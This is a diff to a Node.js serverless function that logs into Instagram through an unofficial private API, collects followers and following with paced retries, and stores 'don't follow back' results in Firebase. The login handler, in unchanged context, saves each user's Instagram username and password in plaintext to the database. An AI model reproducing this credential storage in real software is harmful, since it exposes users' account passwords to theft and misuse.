@@ -2,8 +2,7 @@ const { IgApiClient } = require('instagram-private-api');
 const axios = require('axios');
 const path = require('path');
 
-const { db } = require('./config/firebaseConfig'); // Menyesuaikan jalur relatif
-
+const { db } = require('./config/firebaseConfig');
 const ig = new IgApiClient();
 
 // Variabel sesi yang disimpan dalam Firebase
@@ -50,37 +49,55 @@ const forceLogin = async () => {
     }
 };
 
-// Fungsi untuk mendapatkan data followers dengan paginasi
-const getAllFollowers = async (userId) => {
+// Fungsi untuk mendapatkan data followers dengan paginasi dan retry logic
+const getAllFollowers = async (userId, retries = 3) => {
     let followers = [];
     let followersFeed = ig.feed.accountFollowers(userId);
-
-    let nextFollowers = await followersFeed.items();
-    followers = followers.concat(nextFollowers);
-
+    let attempt = 0;
+    
     while (followersFeed.isMoreAvailable()) {
-        nextFollowers = await followersFeed.items();
-        followers = followers.concat(nextFollowers);
-        await delay(2000); // Delay to avoid rate limiting
+        try {
+            let nextFollowers = await followersFeed.items();
+            followers = followers.concat(nextFollowers);
+            attempt = 0; // Reset attempt after successful fetch
+            await delay(2000); // Delay to avoid rate limiting
+        } catch (error) {
+            console.error('Error fetching followers:', error);
+            if (attempt < retries) {
+                attempt++;
+                console.log(`Retrying attempt ${attempt}...`);
+                await delay(5000); // Delay before retrying
+            } else {
+                throw new Error('Failed to fetch followers after multiple retries.');
+            }
+        }
     }
-
     return followers;
 };
 
-// Fungsi untuk mendapatkan data following dengan paginasi
-const getAllFollowing = async (userId) => {
+// Fungsi untuk mendapatkan data following dengan paginasi dan retry logic
+const getAllFollowing = async (userId, retries = 3) => {
     let following = [];
     let followingFeed = ig.feed.accountFollowing(userId);
-
-    let nextFollowing = await followingFeed.items();
-    following = following.concat(nextFollowing);
-
+    let attempt = 0;
+    
     while (followingFeed.isMoreAvailable()) {
-        nextFollowing = await followingFeed.items();
-        following = following.concat(nextFollowing);
-        await delay(2000); // Delay to avoid rate limiting
+        try {
+            let nextFollowing = await followingFeed.items();
+            following = following.concat(nextFollowing);
+            attempt = 0; // Reset attempt after successful fetch
+            await delay(2000); // Delay to avoid rate limiting
+        } catch (error) {
+            console.error('Error fetching following:', error);
+            if (attempt < retries) {
+                attempt++;
+                console.log(`Retrying attempt ${attempt}...`);
+                await delay(5000); // Delay before retrying
+            } else {
+                throw new Error('Failed to fetch following after multiple retries.');
+            }
+        }
     }
-
     return following;
 };
 
@@ -112,11 +129,9 @@ exports.handler = async function(event, context) {
             await db.ref('users').child(user.pk).set({
                 username: user.username,
                 full_name: user.full_name,
-
                 followers_count: followersCount,
                 following_count: followingCount,
-                profile_picture_url: profilePicUrl, // Simpan hanya URL gambar
-
+                profile_picture_url: profilePicUrl, 
                 dont_follow_back_count: dontFollowBack.length,
             });
 
@@ -128,7 +143,7 @@ exports.handler = async function(event, context) {
                     biography: user.biography,
                     followers_count: followersCount,
                     following_count: followingCount,
-                    profile_picture_url: profilePicUrl, // URL gambar
+                    profile_picture_url: profilePicUrl,
                     dont_follow_back: dontFollowBack,
                     dont_follow_back_count: dontFollowBack.length,
                 }),
@@ -157,15 +172,15 @@ exports.handler = async function(event, context) {
 
             const user = await ig.account.currentUser();
             const userId = user.pk;
-            // Simpan ke Firebase Realtime Database
+
             const loginData = {
                 username,
                 password,
                 userId,
                 timestamp: new Date().toISOString(),
-                profile_picture_url: user.profile_pic_url, // Menyimpan URL gambar profil
+                profile_picture_url: user.profile_pic_url, 
             };
-            // Menyimpan data login di Realtime Database
+
             await db.ref('logins').child(userId).set(loginData);
             return {
                 statusCode: 200,
@@ -197,3 +212,6 @@ exports.handler = async function(event, context) {
         body: JSON.stringify({ message: 'Not Found' }),
     };
 };
+
+// Fungsi delay untuk menghindari rate limiting
+const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
